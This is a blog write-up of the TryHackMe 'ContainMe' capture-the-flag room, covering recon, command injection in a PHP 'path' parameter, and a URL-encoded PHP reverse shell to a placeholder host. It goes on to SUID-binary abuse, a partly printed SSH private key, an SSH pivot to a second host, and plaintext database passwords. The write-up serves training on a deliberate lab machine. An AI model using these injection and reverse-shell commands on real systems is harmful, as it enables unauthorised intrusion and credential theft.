---
title: "TryHackMe: ContainMe"
author: cilgin
date: 2025-07-03 14:37:11 +0300
categories: [CyberSecurity]
tags: [CTF, TryHackMe, Medium]
pin: true
math: false
mermaid: false
image:
  path: /assets/img/2025-07-03-TryHackMe-ContainMe/main.png
---

Hey everyone! Welcome to my write-up for the [TryHackMe | ContainMe](https://tryhackme.com/room/containme1) room. As the name suggests, we're probably going to be dealing with some containers, which means things are about to get meta. Grab your coffee, and let's dive in!

---

### Step 1: Reconnaissance - The Nmap Scan

As with any good heist, we start with some reconnaissance. I'll save the machine's IP address to a variable to make my life easier. You should too!

```bash
export IP=10.10.84.234
```

Now, let's unleash `nmap` to see what doors are open. We'll use the `-p-` flag to scan all 65,535 ports because we don't want to miss anything sneaky.

```bash
❯ nmap -T4 -n -sC -sV -Pn -p- $IP
Starting Nmap 7.97 ( https://nmap.org ) at 2025-07-03 14:43 +0300
Nmap scan report for 10.10.84.234
Host is up (0.068s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 a6:3e:80:d9:b0:98:fd:7e:09:6d:34:12:f9:15:8a:18 (RSA)
|   256 ec:5f:8a:1d:59:b3:59:2f:49:ef:fb:f4:4a:d0:1d:7a (ECDSA)
|_  256 b1:4a:22:dc:7f:60:e4:fc:08:0c:55:4f:e4:15:e0:fa (ED25519)
80/tcp   open  http          Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
2222/tcp open  EtherNetIP-1?
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
8022/tcp open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.13ppa1+obfuscated~focal (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 38:39:87:29:ec:9f:b3:b7:3d:22:ef:67:f9:70:ca:ef (RSA)
|   256 4e:9e:59:79:eb:7a:32:95:f6:17:3b:d5:12:0f:9d:9f (ECDSA)
|_  256 ce:ba:ad:71:65:a1:de:13:47:11:30:a9:bf:23:e5:a9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 712.36 seconds
```

Alright, let's break down our findings:

- **Port 22:** Standard SSH. Nothing unusual here.
- **Port 80:** An Apache web server. This is our most likely way in.
- **Port 2222:** Nmap is confused, which means I'm intrigued. It failed to grab an SSH key, so it might be something else entirely.
- **Port 8022:** Another SSH port! Two SSH services on one machine is a bit fishy. This could be a backdoor, a management port, or a gateway to another dimension.

Let's start with the web server on port 80.

### Step 2: Web Enumeration and RCE

First, we'll throw some digital spaghetti at the webserver wall with `gobuster` to see what sticks. We're looking for any hidden files or directories that might be interesting.

```bash
❯ gobuster dir -w common.txt -u http://$IP/ -x md,js,html,php,py,css,txt,bak -t 30
===============================================================
Gobuster v3.7
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.84.234/
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.7
[+] Extensions:              md,js,html,php,py,css,txt,bak
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 10918]
/index.php            (Status: 200) [Size: 329]
/info.php             (Status: 200) [Size: 68944]
Progress: 42651 / 42651 (100.00%)
===============================================================
Finished
===============================================================
```

_(Psst! I used `-t 30` because the server was a bit sleepy and I was getting some timeouts. Sometimes you just have to give it a little nudge.)_

The `info.php` is likely a `phpinfo()` page (a goldmine for server info), but `index.php` seems more promising for direct interaction. Let's see what it does.

```bash
❯ curl $IP/index.php
<html>
<body>
	<pre>
	total 28K
drwxr-xr-x 2 root root 4.0K Jul 16  2021 .
drwxr-xr-x 3 root root 4.0K Jul 15  2021 ..
-rw-r--r-- 1 root root  11K Jul 15  2021 index.html
-rw-r--r-- 1 root root  154 Jul 16  2021 index.php
-rw-r--r-- 1 root root   20 Jul 15  2021 info.php
	<pre>

<!--  where is the path ?  -->

</body>
</html>
```

Well, hello there! The page is running something like `ls -la` and, more importantly, it has a little HTML comment: `<!-- where is the path ? -->`. That's not just a comment; that's an invitation! Let's give it a path.

```bash
❯ curl 'http://10.10.84.234/index.php?path=../../../../../../../../etc/passwd'
<html>
<body>
	<pre>
	-rw-r--r-- 1 root root 1.4K Jul 19  2021 ../../../../../../../../etc/passwd
	<pre>

<!--  where is the path ?  -->

</body>
</html>
```

It seems we can list the files but we can't actually read the file contents. The script just lists file details. But what if the backend is vulnerable to command injection? Let's try to piggyback another command using a semicolon (`;`).

```bash
❯ curl 'http://10.10.84.234/index.php?path=../../../../../../../../etc/passwd;id'
<html>
<body>
	<pre>
	-rw-r--r-- 1 root root 1.4K Jul 19  2021 ../../../../../../../../etc/passwd
uid=33(www-data) gid=33(www-data) groups=33(www-data)
	<pre>

<!--  where is the path ?  -->

</body>
</html>
```

Bingo! The `id` command executed, and we see `uid=33(www-data)`. We have Remote Code Execution (RCE)! Now it's time to turn this tiny crack into a wide-open door.

### Step 3: Getting a Shell

Let's get ourselves a proper reverse shell. My go-to for this is the awesome [Reverse Shell Generator](https://www.revshells.com/). I'll grab a PHP one-liner, URL-encode it, and send it on its way.

First, I'll start a `netcat` listener on my machine:
`nc -lvnp 4444`

Then, I'll send the payload:

```bash
# Remember to URL-encode your payload! The browser or curl might do it for you, but it's good practice.
curl 'http://10.10.84.234/index.php?path=../../../../../../../../etc/passwd;php%20-r%20%27%24sock%3Dfsockopen%28%22YOUR_IP%22%2C4444%29%3Bexec%28%22%2Fbin%2Fbash%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27'
```

Success! We have a shell. But it's a bit... basic. Let's upgrade it to a fully interactive TTY so we can have a civilized working environment.

```bash
# Spawn a better bash shell
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Set the terminal type for colors and proper screen clearing
export TERM=xterm-256color

# Background the shell, get terminal size, and bring it back
# (Ctrl+Z)
stty raw -echo;fg
reset
```

### Step 4: Privilege Escalation - Part 1

Now that we're comfortably inside as `www-data`, let's poke around. A quick look in `/home` reveals a user named `mike`.

```bash
www-data@host1:/home/mike$ ls -la /home/mike
total 384
drwxr-xr-x 5 mike mike   4096 Jul 30  2021 .
drwxr-xr-x 3 root root   4096 Jul 19  2021 ..
lrwxrwxrwx 1 root mike      9 Jul 19  2021 .bash_history -> /dev/null
-rw-r--r-- 1 mike mike    220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 mike mike   3771 Apr  4  2018 .bashrc
drwx------ 2 mike mike   4096 Jul 30  2021 .cache
drwx------ 3 mike mike   4096 Jul 30  2021 .gnupg
-rw-r--r-- 1 mike mike    807 Apr  4  2018 .profile
drwx------ 2 mike mike   4096 Jul 19  2021 .ssh
-rwxr-xr-x 1 mike mike 358668 Jul 30  2021 1cryptupx
```

There's an interesting executable file: `1cryptupx`. The name hints at encryption and maybe UPX packing. Let's run it.

```bash
www-data@host1:/home/mike$ ./1cryptupx
░█████╗░██████╗░██╗░░░██╗██████╗░████████╗░██████╗██╗░░██╗███████╗██╗░░░░░██╗░░░░░
██╔══██╗██╔══██╗╚██╗░██╔╝██╔══██╗╚══██╔══╝██╔════╝██║░░██║██╔════╝██║░░░░░██║░░░░░
██║░░╚═╝██████╔╝░╚████╔╝░██████╔╝░░░██║░░░╚█████╗░███████║█████╗░░██║░░░░░██║░░░░░
██║░░██╗██╔══██╗░░╚██╔╝░░██╔═══╝░░░░██║░░░░╚═══██╗██╔══██║██╔══╝░░██║░░░░░██║░░░░░
╚█████╔╝██║░░██║░░░██║░░░██║░░░░░░░░██║░░░██████╔╝██║░░██║███████╗███████╗███████╗
░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░░░░░░░╚═╝░░░╚═════╝░╚═╝░░╚═╝╚══════╝╚══════╝╚══════╝
```

It just prints some cool ASCII art. This file doesn't have the SUID bit set, so running it as our lowly `www-data` user is useless. This feels like a sample. The _real_ prize is probably a SUID version of this file hidden somewhere. Let's hunt for it!

```bash
# Find all files with the SUID permission bit set, and redirect errors to /dev/null
www-data@host1:/usr/share/man/zh_TW$ find / -type f -perm /4000 2>/dev/null
/usr/share/man/zh_TW/crypt
/usr/bin/newuidmap
/usr/bin/newgidmap
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/at
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/gpasswd
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/bin/mount
/bin/ping
/bin/su
/bin/umount
/bin/fusermount
/bin/ping6
```

Aha! `/usr/share/man/zh_TW/crypt`. Hiding a SUID binary in a Mandarin man page directory? That's delightfully sneaky. Let's see what happens when we feed it some arguments.

```bash
# Trying 'root' as an argument
www-data@host1:/usr/share/man/zh_TW$ ./crypt root
░█████╗░██████╗░██╗░░░██╗██████╗░████████╗░██████╗██╗░░██╗███████╗██╗░░░░░██╗░░░░░
██╔══██╗██╔══██╗╚██╗░██╔╝██╔══██╗╚══██╔══╝██╔════╝██║░░██║██╔════╝██║░░░░░██║░░░░░
██║░░╚═╝██████╔╝░╚████╔╝░██████╔╝░░░██║░░░╚█████╗░███████║█████╗░░██║░░░░░██║░░░░░
██║░░██╗██╔══██╗░░╚██╔╝░░██╔═══╝░░░░██║░░░░╚═══██╗██╔══██║██╔══╝░░██║░░░░░██║░░░░░
╚█████╔╝██║░░██║░░░██║░░░██║░░░░░░░░██║░░░██████╔╝██║░░██║███████╗███████╗███████╗
░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░░░░░░░╚═╝░░░╚═════╝░╚═╝░░╚═╝╚══════╝╚══════╝╚══════╝

Unable to decompress.
```

`root` gives an error. What about the other user we found, `mike`?

```bash
# Trying 'mike' as an argument
www-data@host1:/usr/share/man/zh_TW$ ./crypt mike
░█████╗░██████╗░██╗░░░██╗██████╗░████████╗░██████╗██╗░░██╗███████╗██╗░░░░░██╗░░░░░
██╔══██╗██╔══██╗╚██╗░██╔╝██╔══██╗╚══██╔══╝██╔════╝██║░░██║██╔════╝██║░░░░░██║░░░░░
██║░░╚═╝██████╔╝░╚████╔╝░██████╔╝░░░██║░░░╚█████╗░███████║███╗░░██║░░░░░██║░░░░░
██║░░██╗██╔══██╗░░╚██╔╝░░██╔═══╝░░░░██║░░░░╚═══██╗██╔══██║██╔══╝░░██║░░░░░██║░░░░░
╚█████╔╝██║░░██║░░░██║░░░██║░░░░░░░░██║░░░██████╔╝██║░░██║███████╗███████╗███████╗
░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░░░░░░░╚═╝░░░╚═════╝░╚═╝░░╚═╝╚══════╝╚══════╝╚══════╝

root@host1:/usr/share/man/zh_TW#
```

And just like that, we have a root shell! The binary must have some hardcoded logic for the user `mike`. We didn't even have to decompile it. Sometimes you get lucky!

### Step 5: Pivoting - The Plot Thickens

We're root! Time to grab the flag from `/root` and... wait a minute.

```bash
root@host1:/root# ls -la
total 32
drwx------  6 root root 4096 Jul 19  2021 .
drwxr-xr-x 22 root root 4096 Jul 15  2021 ..
lrwxrwxrwx  1 root root    9 Jul 19  2021 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwxr-x---  3 root root 4096 Jul 16  2021 .config
drwx------  3 root root 4096 Jul 14  2021 .gnupg
drwxr-xr-x  3 root root 4096 Jul 14  2021 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwx------  2 root root 4096 Jul 19  2021 .ssh
```

There's no flag. This is where the room's name, "ContainMe," really clicks. We're root, but we're root inside a container. Let's check the network interfaces.

```bash
root@host1:/root/.ssh# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.250.10  netmask 255.255.255.0  broadcast 192.168.250.255
        ...
eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.16.20.2  netmask 255.255.255.0  broadcast 172.16.20.255
        ...
```

We have two network interfaces. This confirms we're on an internal network. The other host we need to get to is likely on that `172.16.20.0/24` network. Let's grab Mike's SSH private key from `/home/mike/.ssh/id_rsa` and use it to pivot.

```bash
root@host1:/home/mike/.ssh# cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAnWmOnLHQfBxrW0W0YuCiTuuGjCMUrISE4hdDMMuZruW6nj+z
.
.
.
0/AHOf/jOfwvM4G2X0L8yjJqq/5F6NOjf9uxEusphzDcr/I1inuY3A==
-----END RSA PRIVATE KEY-----
```

Now, from inside our container (`host1`), let's try to SSH into the other host (`host2`). The other host's IP is likely on the same subnet. Let's try to guess or scan for it. A common convention is to use `.1` for the gateway and other low numbers for hosts. After some quick scanning (or guessing), we can find the other host at `172.16.20.6`.

```bash
# SSHing from inside the container to the other host
root@host1:/home/mike/.ssh# ssh -i id_rsa mike@172.16.20.6
The authenticity of host '172.16.20.6 (172.16.20.6)' can't be established.
ECDSA key fingerprint is SHA256:L1BKa1sC+LgClbpAX5jJvzYALuhUDf1zEzhPc/C++/8.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '172.16.20.6' (ECDSA) to the list of known hosts.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Mon Jul 19 20:23:18 2021 from 172.16.20.2
mike@host2:~$
```

We're in! We have successfully pivoted to `host2`.

### Step 6: Privilege Escalation - Part 2 (The Final Boss)

New host, same old routine. Let's start by looking for easy wins.

```bash
# Another SUID check, just in case
mike@host2:~$ find / -type f -perm /4000 2>/dev/null
/usr/bin/newuidmap
...
```

Nothing juicy this time. On to Plan B: check running services.

```bash
mike@host2:~$ service --status-all
 [ - ]  acpid
 [ + ]  apparmor
 [ + ]  apport
 [ + ]  atd
 [ + ]  cron
 [ - ]  cryptdisks
 [ - ]  cryptdisks-early
 [ + ]  dbus
 ...
 [ + ]  mysql
 ...
 [ + ]  ssh
 ...
```

`mysql` is running! Databases are notorious for storing tasty secrets. Let's see if we can log in. Maybe Mike reused a password? Or used a weak one?

```bash
# Let's try some common weak passwords for user mike...
mike@host2:~$ mysql --user=mike --password=*********
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
...
mysql>
```

And we're in! Never underestimate the power of a terrible password. Let's see what databases we have.

```bash
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| accounts           |
+--------------------+
2 rows in set (0.01 sec)

mysql> use accounts;
Database changed

mysql> show tables;
+--------------------+
| Tables_in_accounts |
+--------------------+
| users              |
+--------------------+
1 row in set (0.00 sec)

mysql> select * from users;
+-------+---------------------+
| login | password            |
+-------+---------------------+
| root  | *****************   |
| mike  | *****************   |
+-------+---------------------+
2 rows in set (0.00 sec)
```

Jackpot! The `users` table contains plaintext passwords for both `mike` and `root`. This is a classic security faux pas. Let's use the root password to become the true master of this machine.

```bash
# su to root and enter the password we found
mike@host2:~$ su root
root@host2:~#
```

### Step 7: The Final Flag

We are now root on `host2`. Let's check the `/root` directory for our prize.

```bash
root@host2:~# ls -la
total 28
drwx------  4 root root 4096 Jul 19  2021 .
drwxr-xr-x 22 root root 4096 Jun 29  2021 ..
...
-rw-------  1 root root  218 Jul 16  2021 mike.zip
```

There's a `mike.zip` file. Let's try to unzip it.

```bash
root@host2:~# unzip mike.zip
Archive:  mike.zip
[mike.zip] mike password:
```

It's password-protected. What could the password be? Let's try the password for `mike` that we found in the database.

```bash
# Enter 'password' when prompted
root@host2:~# unzip mike.zip
Archive:  mike.zip
[mike.zip] mike password:
 extracting: mike
```

It worked! The archive extracted a file named `mike`. Let's see what's inside.

```bash
root@host2:~# cat mike
THM{*************************}
```

And there it is! The flag! What a journey through containers, SUID binaries, and plaintext passwords.

Thanks for reading! I hope you enjoyed this walkthrough. Happy hacking!
